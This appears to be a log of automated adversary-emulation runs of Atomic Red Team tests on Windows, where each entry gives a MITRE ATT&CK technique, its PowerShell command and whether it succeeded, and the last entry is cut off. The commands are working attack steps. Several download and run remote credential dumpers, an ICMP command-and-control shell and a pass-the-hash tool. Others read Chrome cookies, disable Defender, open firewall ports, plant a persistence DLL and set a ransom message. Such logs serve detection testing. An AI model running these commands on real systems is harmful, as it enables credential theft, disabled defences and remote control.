==============================
adversary_id: atomic__t1055_003__multiple__thread_execution_hijacking__6a64ea6e29cdb83d468a27d6f69960cb__trial_1

atomic_ordering: ['6a64ea6e29cdb83d468a27d6f69960cb']
------------------------------
{'ability_id': '6a64ea6e29cdb83d468a27d6f69960cb',
 'agent_reported_time': '2023-11-11T13:10:10Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1055.003',
            'technique_name': 'Thread Execution Hijacking'},
 'command': '$notepad = Start-Process notepad -passthru; Start-Process '
            '"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe"; '
            'Start-Sleep -Seconds 5; Stop-Process $notepad.id',
 'delegated': '2023-11-28T01:09:35Z',
 'description': 'This test injects a MessageBox shellcode generated by '
                'msfvenom in Notepad.exe using Thread Execution Hijacking. '
                'When successful, a message box will appear with the "Atomic '
                'Red Team" caption after one or two seconds. ',
 'executor': 'psh',
 'link_id': '46686ec0-fe7f-4566-8171-e753213ac3ab',
 'name': 'Thread Execution Hijacking',
 'pid': 10176,
 'plaintext_command': '$notepad = Start-Process notepad -passthru; '
                      'Start-Process '
                      '"$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe"; '
                      'Start-Sleep -Seconds 5; Stop-Process $notepad.id',
 'platform': 'windows',
 'run': '2023-11-28T01:09:56Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__aa40e8fe704a97fb7f7a5a02e9334824__trial_1

atomic_ordering: ['aa40e8fe704a97fb7f7a5a02e9334824']
------------------------------
{'ability_id': 'aa40e8fe704a97fb7f7a5a02e9334824',
 'agent_reported_time': '2023-11-11T13:10:10Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.004',
            'technique_name': 'Access Token Manipulation: Parent PID Spoofing'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Get-CimInstance -ClassName Win32_Process -Property Name, '
            'CommandLine, ProcessId -Filter "Name = \'svchost.exe\' AND '
            'CommandLine LIKE \'%\'" | Select-Object -First 1 | '
            'Start-ATHProcessUnderSpecificParent -FilePath '
            '$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
            "-CommandLine '-Command Start-Sleep 10'",
 'delegated': '2023-11-30T08:54:26Z',
 'description': 'Spawnd a process as a child of the first accessible '
                'svchost.exe process.',
 'executor': 'psh',
 'link_id': '87ee8578-48eb-41bb-80ae-3be513b71f6a',
 'name': 'Parent PID Spoofing - Spawn from svchost.exe',
 'pid': 380,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Get-CimInstance -ClassName '
                      'Win32_Process -Property Name, CommandLine, ProcessId '
                      '-Filter "Name = \'svchost.exe\' AND CommandLine LIKE '
                      '\'%\'" | Select-Object -First 1 | '
                      'Start-ATHProcessUnderSpecificParent -FilePath '
                      '$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
                      "-CommandLine '-Command Start-Sleep 10'",
 'platform': 'windows',
 'run': '2023-11-30T08:55:13Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098_001__persistence__account_manipulation-_additional_cloud_credentials__7d46c4731c7b6ade58e43877e4b7dc66__trial_1

atomic_ordering: ['7d46c4731c7b6ade58e43877e4b7dc66']
==============================
==============================
adversary_id: atomic__t1049__discovery__system_network_connections_discovery__8ed60dceb98746f1da6214f4f6af7164__trial_1

atomic_ordering: ['8ed60dceb98746f1da6214f4f6af7164']
------------------------------
{'ability_id': '8ed60dceb98746f1da6214f4f6af7164',
 'agent_reported_time': '2023-11-11T13:10:00Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1049',
            'technique_name': 'System Network Connections Discovery'},
 'command': 'Get-NetTCPConnection',
 'delegated': '2023-11-27T22:17:00Z',
 'description': 'Get a listing of network connections.\n'
                '\n'
                'Upon successful execution, powershell.exe will execute '
                '`get-NetTCPConnection`. Results will output via stdout.\n',
 'executor': 'psh',
 'link_id': '3be40306-dd78-4d9f-9f41-e690a3d71923',
 'name': 'System Network Connections Discovery with PowerShell',
 'pid': 2456,
 'plaintext_command': 'Get-NetTCPConnection',
 'platform': 'windows',
 'run': '2023-11-27T22:17:17Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__32047c4f30d4e65ebc9b22b9b8368bca__trial_1

atomic_ordering: ['32047c4f30d4e65ebc9b22b9b8368bca']
------------------------------
{'ability_id': '32047c4f30d4e65ebc9b22b9b8368bca',
 'agent_reported_time': '2023-11-11T13:08:58Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'Set-MpPreference -drtm $True; Set-MpPreference -dbm $True; '
            'Set-MpPreference -dscrptsc $True; Set-MpPreference -dbaf $True',
 'delegated': '2023-12-03T09:32:18Z',
 'description': 'Attempting to disable scheduled scanning and other parts of '
                'Windows Defender ATP using set-MpPreference aliases. Upon '
                'execution Virus and Threat Protection will show as disabled\n'
                'in Windows settings.\n',
 'executor': 'psh',
 'link_id': 'd0210337-3b10-41fb-b740-2b595408f207',
 'name': 'Tamper with Windows Defender ATP using Aliases - PowerShell',
 'pid': 10196,
 'plaintext_command': 'Set-MpPreference -drtm $True; Set-MpPreference -dbm '
                      '$True; Set-MpPreference -dscrptsc $True; '
                      'Set-MpPreference -dbaf $True',
 'platform': 'windows',
 'run': '2023-12-03T09:32:34Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1539__credential-access__steal_web_session_cookie__126aaf80c6a232eaf08dcef3163d4aed__trial_1

atomic_ordering: ['126aaf80c6a232eaf08dcef3163d4aed']
------------------------------
{'ability_id': '126aaf80c6a232eaf08dcef3163d4aed',
 'agent_reported_time': '2023-11-11T13:10:04Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1539',
            'technique_name': 'Steal Web Session Cookie'},
 'command': 'stop-process -name "chrome" -force -erroraction silentlycontinue; '
            '"select host_key, name, encrypted_value, path, expires_utc, '
            'is_secure, is_httponly from [Cookies];" | cmd /c '
            'PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe '
            '"$env:localappdata\\Google\\Chrome\\User '
            'Data\\Default\\Network\\Cookies" | out-file -filepath '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"',
 'delegated': '2023-12-01T17:30:31Z',
 'description': "This test queries Chrome's SQLite database to steal the "
                'encrypted cookie data, designed to function similarly to '
                "Zloader/Zbot's cookie theft function. \n"
                'Once an adversary obtains the encrypted cookie info, they '
                'could go on to decrypt the encrypted value, potentially '
                'allowing for session theft. \n'
                'Note: If Chrome is running, the process will be killed to '
                "ensure that the DB file isn't locked. \n"
                'See '
                'https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n',
 'executor': 'psh',
 'link_id': '8f25fc02-a01e-4d64-af06-86ae798ed04a',
 'name': 'Steal Chrome Cookies (Windows)',
 'pid': 212,
 'plaintext_command': 'stop-process -name "chrome" -force -erroraction '
                      'silentlycontinue; "select host_key, name, '
                      'encrypted_value, path, expires_utc, is_secure, '
                      'is_httponly from [Cookies];" | cmd /c '
                      'PathToAtomicsFolder\\..\\ExternalPayloads\\sqlite-tools-win32-x86-3380200\\sqlite3.exe '
                      '"$env:localappdata\\Google\\Chrome\\User '
                      'Data\\Default\\Network\\Cookies" | out-file -filepath '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1539ChromeCookies.txt"',
 'platform': 'windows',
 'run': '2023-12-01T17:30:49Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_003__multiple__time_providers__7a4867f379d79c82f217108c48bdbf33__trial_1

atomic_ordering: ['7a4867f379d79c82f217108c48bdbf33']
------------------------------
{'ability_id': '7a4867f379d79c82f217108c48bdbf33',
 'agent_reported_time': '2023-11-11T13:09:49Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.003',
            'technique_name': 'Time Providers'},
 'command': 'net stop w32time; Copy-Item '
            '"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll" '
            'C:\\Users\\Public\\AtomicTest.dll; reg add '
            '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer" '
            '/t REG_SZ /v "DllName" /d "C:\\Users\\Public\\AtomicTest.dll" /f; '
            'reg add '
            '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer" '
            '/t REG_DWORD /v "Enabled" /d "1" /f; reg add '
            '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer" '
            '/t REG_DWORD /v "InputProvider" /d "1" /f; net start w32time',
 'delegated': '2023-12-02T04:43:23Z',
 'description': 'Establishes persistence by editing the NtpServer time '
                'provider registry key under '
                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\n'
                'The time provider will point to a DLL which will be loaded '
                'after the w32time service is started. The DLL will then '
                'create the file AtomicTest.txt\n'
                'in C:\\Users\\Public\\ as validation that the test is '
                'successful.\n'
                '\n'
                'Payload source code: '
                'https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n',
 'executor': 'psh',
 'link_id': '55322668-73b3-4e06-9ac3-4d747a80fa75',
 'name': 'Edit an existing time provider',
 'pid': 1576,
 'plaintext_command': 'net stop w32time; Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll" '
                      'C:\\Users\\Public\\AtomicTest.dll; reg add '
                      '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer" '
                      '/t REG_SZ /v "DllName" /d '
                      '"C:\\Users\\Public\\AtomicTest.dll" /f; reg add '
                      '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer" '
                      '/t REG_DWORD /v "Enabled" /d "1" /f; reg add '
                      '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer" '
                      '/t REG_DWORD /v "InputProvider" /d "1" /f; net start '
                      'w32time',
 'platform': 'windows',
 'run': '2023-12-02T04:43:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_004__credential-access__credentials_from_password_stores-_windows_credential_manager__1353d954c020fa5ff039b7e85ee261bc__trial_1

atomic_ordering: ['1353d954c020fa5ff039b7e85ee261bc']
------------------------------
{'ability_id': '1353d954c020fa5ff039b7e85ee261bc',
 'agent_reported_time': '2023-11-11T13:10:38Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.004',
            'technique_name': 'Credentials from Password Stores: Windows '
                              'Credential Manager'},
 'command': 'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'); "
            'Invoke-WCMDump',
 'delegated': '2023-12-03T01:09:53Z',
 'description': 'Loot local Credentials - Invoke-WCMDump technique via '
                'function of WinPwn',
 'executor': 'psh',
 'link_id': 'f33a42b4-764a-4faa-b80e-260b62f9bc20',
 'name': 'WinPwn - Loot local Credentials - Invoke-WCMDump',
 'pid': 10248,
 'plaintext_command': 'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'); "
                      'Invoke-WCMDump',
 'platform': 'windows',
 'run': '2023-12-03T01:10:39Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1105__command-and-control__ingress_tool_transfer__a88b5c13a1d5d6bdf02b66bc73411f41__trial_1

atomic_ordering: ['a88b5c13a1d5d6bdf02b66bc73411f41']
------------------------------
{'ability_id': 'a88b5c13a1d5d6bdf02b66bc73411f41',
 'agent_reported_time': '2023-11-11T13:10:41Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1105',
            'technique_name': 'Ingress Tool Transfer'},
 'command': '(New-Object '
            'System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", '
            '"$env:TEMP\\Atomic-license.txt")',
 'delegated': '2023-11-29T18:05:52Z',
 'description': 'This test uses PowerShell to download a payload.\n'
                'This technique is used by multiple adversaries and malware '
                'families.\n',
 'executor': 'psh',
 'link_id': 'eb87adfe-8f77-439d-a0e2-832fcf60f758',
 'name': 'Windows - PowerShell Download',
 'pid': 10636,
 'plaintext_command': '(New-Object '
                      'System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", '
                      '"$env:TEMP\\Atomic-license.txt")',
 'platform': 'windows',
 'run': '2023-11-29T18:06:39Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1562_004__defense-evasion__impair_defenses-_disable_or_modify_system_firewall__9378f5d52c7f94cd08f407f8c0a5fbd7__trial_1

atomic_ordering: ['9378f5d52c7f94cd08f407f8c0a5fbd7']
------------------------------
{'ability_id': '9378f5d52c7f94cd08f407f8c0a5fbd7',
 'agent_reported_time': '2023-11-11T13:09:47Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.004',
            'technique_name': 'Impair Defenses: Disable or Modify System '
                              'Firewall'},
 'command': 'netsh advfirewall firewall add rule name="Open Port to Any" '
            'dir=in protocol=tcp localport=3389 action=allow profile=any',
 'delegated': '2023-12-03T16:20:11Z',
 'description': 'This test will attempt to open a local port defined by input '
                'arguments to any profile',
 'executor': 'psh',
 'link_id': '50bf6185-2c14-4b99-bfbf-a5a12338efd5',
 'name': 'Open a local port through Windows Firewall to any profile',
 'pid': 764,
 'plaintext_command': 'netsh advfirewall firewall add rule name="Open Port to '
                      'Any" dir=in protocol=tcp localport=3389 action=allow '
                      'profile=any',
 'platform': 'windows',
 'run': '2023-12-03T16:20:21Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1555__credential-access__credentials_from_password_stores__d74777514cba5a4fd4f297261ed0d8ef__trial_1

atomic_ordering: ['d74777514cba5a4fd4f297261ed0d8ef']
------------------------------
{'ability_id': 'd74777514cba5a4fd4f297261ed0d8ef',
 'agent_reported_time': '2023-11-11T13:09:48Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555',
            'technique_name': 'Credentials from Password Stores'},
 'command': 'IEX (IWR '
            "'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' "
            '-UseBasicParsing); Get-PasswordVaultCredentials -Force',
 'delegated': '2023-12-03T03:06:50Z',
 'description': 'This module will extract the credentials from Windows '
                'Credential Manager',
 'executor': 'psh',
 'link_id': '4bf167cc-4ade-4651-b53f-b323b5805e52',
 'name': 'Dump credentials from Windows Credential Manager With PowerShell '
         '[windows Credentials]',
 'pid': 7136,
 'plaintext_command': 'IEX (IWR '
                      "'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' "
                      '-UseBasicParsing); Get-PasswordVaultCredentials -Force',
 'platform': 'windows',
 'run': '2023-12-03T03:06:57Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1112__defense-evasion__modify_registry__0424ccb447bfa66b94162266f55ecd52__trial_1

atomic_ordering: ['0424ccb447bfa66b94162266f55ecd52']
------------------------------
{'ability_id': '0424ccb447bfa66b94162266f55ecd52',
 'agent_reported_time': '2023-11-11T13:10:23Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1112',
            'technique_name': 'Modify Registry'},
 'command': 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine',
 'delegated': '2023-11-29T23:15:54Z',
 'description': 'Attackers need to change the powershell execution policy in '
                'order to run their malicious powershell scripts.\n'
                'They can either specify it during the execution of the '
                'powershell script or change the registry value for it.\n',
 'executor': 'psh',
 'link_id': '345a0e83-2445-4fe2-b0ee-7f1839f7fd6b',
 'name': 'Change Powershell Execution Policy to Bypass',
 'pid': 9388,
 'plaintext_command': 'Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope '
                      'LocalMachine',
 'platform': 'windows',
 'run': '2023-11-29T23:16:36Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__e9e69b4fedb8e40d634865ce9a3192dc__trial_1

atomic_ordering: ['e9e69b4fedb8e40d634865ce9a3192dc']
------------------------------
{'ability_id': 'e9e69b4fedb8e40d634865ce9a3192dc',
 'agent_reported_time': '2023-11-11T13:09:38Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1497.001',
            'technique_name': 'Virtualization/Sandbox Evasion: System Checks'},
 'command': '$error.clear(); Get-WmiObject -Query "SELECT * FROM '
            'MSAcpi_ThermalZoneTemperature" -ErrorAction SilentlyContinue; '
            'if($error) {echo "Virtualization Environment detected"}',
 'delegated': '2023-12-01T11:41:11Z',
 'description': 'Windows Management Instrumentation(WMI) objects contains '
                'system information which helps to detect virtualization. This '
                'command will specifically attempt to get the '
                'CurrentTemperature value from this object and will check to '
                'see if the attempt results in an error that contains the word '
                'supported. This is meant to find the result of Not supported, '
                'which is the result if run in a virtual machine\n',
 'executor': 'psh',
 'link_id': 'c5558f18-f06e-4301-bd41-94e5c2a5b586',
 'name': 'Detect Virtualization Environment (Windows)',
 'pid': 5172,
 'plaintext_command': '$error.clear(); Get-WmiObject -Query "SELECT * FROM '
                      'MSAcpi_ThermalZoneTemperature" -ErrorAction '
                      'SilentlyContinue; if($error) {echo "Virtualization '
                      'Environment detected"}',
 'platform': 'windows',
 'run': '2023-12-01T11:41:31Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1095__command-and-control__non-application_layer_protocol__9ed218029d8392d2b4fdedd0f44bb052__trial_1

atomic_ordering: ['9ed218029d8392d2b4fdedd0f44bb052']
------------------------------
{'ability_id': '9ed218029d8392d2b4fdedd0f44bb052',
 'agent_reported_time': '2023-11-11T13:10:06Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1095',
            'technique_name': 'Non-Application Layer Protocol'},
 'command': 'IEX (New-Object '
            "System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); "
            'Invoke-PowerShellIcmp -IPAddress',
 'delegated': '2023-11-29T10:42:14Z',
 'description': 'This will attempt to  start C2 Session Using ICMP. For '
                'information on how to set up the listener\n'
                'refer to the following blog: '
                'https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n',
 'executor': 'psh',
 'link_id': '01182e81-d2db-491c-a9c1-a0020bf03a5e',
 'name': 'ICMP C2',
 'pid': 8224,
 'plaintext_command': 'IEX (New-Object '
                      "System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); "
                      'Invoke-PowerShellIcmp -IPAddress',
 'platform': 'windows',
 'run': '2023-11-29T10:42:25Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1036__defense-evasion__masquerading__bc456ce28da22e33b96257b6ae020391__trial_1

atomic_ordering: ['bc456ce28da22e33b96257b6ae020391']
------------------------------
{'ability_id': 'bc456ce28da22e33b96257b6ae020391',
 'agent_reported_time': '2023-11-11T13:10:04Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1036',
            'technique_name': 'Masquerading'},
 'command': 'copy-item "$env:windir\\System32\\cmd.exe" -destination '
            '"$env:allusersprofile\\cmd.exe"; start-process '
            '"$env:allusersprofile\\cmd.exe"; sleep -s 5 ; stop-process -name '
            '"cmd" | out-null',
 'delegated': '2023-11-27T16:28:11Z',
 'description': 'It may be suspicious seeing a file copy of an EXE in System32 '
                'or SysWOW64 to a non-system directory or executing from a '
                'non-system directory.',
 'executor': 'psh',
 'link_id': '45ba1ca2-6be7-47f8-8fd8-d0b91f5f0ab0',
 'name': 'System File Copied to Unusual Location',
 'pid': 380,
 'plaintext_command': 'copy-item "$env:windir\\System32\\cmd.exe" -destination '
                      '"$env:allusersprofile\\cmd.exe"; start-process '
                      '"$env:allusersprofile\\cmd.exe"; sleep -s 5 ; '
                      'stop-process -name "cmd" | out-null',
 'platform': 'windows',
 'run': '2023-11-27T16:28:26Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1021_001__lateral-movement__remote_services-_remote_desktop_protocol__aabe23a58568de3f9cc40e42e5f1b223__trial_1

atomic_ordering: ['aabe23a58568de3f9cc40e42e5f1b223']
------------------------------
{'ability_id': 'aabe23a58568de3f9cc40e42e5f1b223',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'lateral-movement',
            'technique_id': 'T1021.001',
            'technique_name': 'Remote Services: Remote Desktop Protocol'},
 'command': 'Set-ItemProperty -Path '
            "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal "
            'Server\\WinStations\\RDP-Tcp\' -name "PortNumber" -Value 4489; '
            "New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile "
            "'Public' -Direction Inbound -Action Allow -Protocol TCP "
            '-LocalPort 4489',
 'delegated': '2023-11-27T09:22:20Z',
 'description': 'Changing RDP Port to Non Standard Port via Powershell\n',
 'executor': 'psh',
 'link_id': 'f0f28bb4-6d8f-4537-a3cd-0ebf07051a24',
 'name': 'Changing RDP Port to Non Standard Port via Powershell',
 'pid': 3788,
 'plaintext_command': 'Set-ItemProperty -Path '
                      "'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal "
                      'Server\\WinStations\\RDP-Tcp\' -name "PortNumber" '
                      '-Value 4489; New-NetFirewallRule -DisplayName '
                      "'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction "
                      'Inbound -Action Allow -Protocol TCP -LocalPort 4489',
 'platform': 'windows',
 'run': '2023-11-27T09:22:48Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1550_002__multiple__use_alternate_authentication_material-_pass_the_hash__8ce073cf3170576e1f5c6e4d06e1873a__trial_1

atomic_ordering: ['8ce073cf3170576e1f5c6e4d06e1873a']
------------------------------
{'ability_id': '8ce073cf3170576e1f5c6e4d06e1873a',
 'agent_reported_time': '2023-11-11T13:09:45Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1550.002',
            'technique_name': 'Use Alternate Authentication Material: Pass the '
                              'Hash'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' "
            '-UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME '
            '-Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a '
            '-Command hostname',
 'delegated': '2023-12-02T13:29:20Z',
 'description': 'Use Invoke-WMIExec to Pass the Hash\n'
                'Note: must dump hashes first\n'
                '[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)',
 'executor': 'psh',
 'link_id': '5f71133c-0757-480a-8b31-22fd2767ad0a',
 'name': 'Invoke-WMIExec Pass the Hash',
 'pid': 6896,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' "
                      '-UseBasicParsing);Invoke-WMIExec -Target '
                      '$env:COMPUTERNAME -Username Administrator -Hash '
                      'cc36cf7a8514893efccd3324464tkg1a -Command hostname',
 'platform': 'windows',
 'run': '2023-12-02T13:29:34Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1491_001__impact__defacement-_internal_defacement__2fc2e45dde68ab78a97a22ca138652e1__trial_1

atomic_ordering: ['2fc2e45dde68ab78a97a22ca138652e1']
------------------------------
{'ability_id': '2fc2e45dde68ab78a97a22ca138652e1',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'impact',
            'technique_id': 'T1491.001',
            'technique_name': 'Defacement: Internal Defacement'},
 'command': '$orgLegalNoticeCaption = (Get-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
            '-Name LegalNoticeCaption).LegalNoticeCaption; $orgLegalNoticeText '
            '= (Get-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
            '-Name LegalNoticeText).LegalNoticeText; $newLegalNoticeCaption = '
            '"PYSA"; $newLegalNoticeText = "Hi Company, every byte on any '
            "types of your devices was encrypted. Don't try to use backups "
            'because it were encrypted too. To get all your data contact '
            'us:xxxx@onionmail.org"; Set-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
            '-Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type '
            'String -Force; Set-ItemProperty '
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
            '-Name LegalNoticeText -Value $newLegalNoticeText -Type String '
            '-Force',
 'delegated': '2023-12-01T10:44:03Z',
 'description': 'Display ransom message to users at system start-up by '
                'configuring registry keys '
                'HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption '
                'and '
                'HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n'
                '\n'
                '[SynAck '
                'Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n'
                '[Grief '
                'Ransomware](https://redcanary.com/blog/grief-ransomware/), \n'
                '[Maze '
                'Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n'
                '[Pysa '
                'Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n'
                '[Spook '
                'Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n'
                '[DopplePaymer '
                'Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n'
                '[Reedemer '
                'Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n'
                '[Kangaroo '
                'Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n',
 'executor': 'psh',
 'link_id': 'c0201124-20ef-490c-a3b4-38d3ae55d458',
 'name': 'Configure LegalNoticeCaption and LegalNoticeText registry keys to '
         'display ransom message',
 'pid': 9228,
 'plaintext_command': '$orgLegalNoticeCaption = (Get-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
                      '-Name LegalNoticeCaption).LegalNoticeCaption; '
                      '$orgLegalNoticeText = (Get-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
                      '-Name LegalNoticeText).LegalNoticeText; '
                      '$newLegalNoticeCaption = "PYSA"; $newLegalNoticeText = '
                      '"Hi Company, every byte on any types of your devices '
                      "was encrypted. Don't try to use backups because it were "
                      'encrypted too. To get all your data contact '
                      'us:xxxx@onionmail.org"; Set-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
                      '-Name LegalNoticeCaption -Value $newLegalNoticeCaption '
                      '-Type String -Force; Set-ItemProperty '
                      'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System '
                      '-Name LegalNoticeText -Value $newLegalNoticeText -Type '
                      'String -Force',
 'platform': 'windows',
 'run': '2023-12-01T10:44:19Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__d1bde9af5206152c9980a5b6adcc1813__trial_1

atomic_ordering: ['d1bde9af5206152c9980a5b6adcc1813']
------------------------------
{'ability_id': 'd1bde9af5206152c9980a5b6adcc1813',
 'agent_reported_time': '2023-11-11T13:10:10Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.001',
            'technique_name': 'Access Token Manipulation: Token '
